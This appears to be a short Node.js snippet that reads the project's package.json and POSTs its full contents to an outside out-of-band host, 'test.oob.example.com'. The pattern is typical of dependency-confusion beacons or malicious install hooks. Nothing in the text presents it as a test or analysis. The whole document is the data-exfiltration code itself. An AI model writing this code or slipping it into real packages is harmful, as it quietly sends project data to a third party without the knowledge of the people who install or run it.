const https = require('https');
const pkg = require('./package.json');
const req = https.request({hostname:'test.oob.example.com', method:'POST'});
req.write(JSON.stringify(pkg)); req.end();
